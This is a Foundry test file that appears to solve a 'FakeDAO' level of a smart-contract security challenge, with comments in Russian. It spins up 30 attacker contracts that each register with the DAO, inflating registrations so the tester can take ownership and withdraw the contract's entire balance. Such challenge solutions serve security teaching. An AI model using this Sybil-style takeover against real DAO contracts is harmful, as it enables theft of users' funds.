// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";

// forge test --match-contract FakeDAOTest -vvvv
contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
    }

    function testExploitLevel() public {
         vm.startPrank(tx.origin);

        // Создаем несколько контрактов-атаки
        for (uint256 j = 0; j < 30; j++) {
            AttackContract attacker = new AttackContract(instance);
            attacker.executeAttack();
        }

        // Регистрируем и выводим средства из DAO
        instance.register();
        instance.withdraw();

        vm.stopPrank();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract AttackContract {
    FakeDAO dao;

    constructor(FakeDAO _dao) {
        dao = _dao;
    }

    function executeAttack() external {
        // Выполняем регистрацию в DAO
        dao.register();
    }
}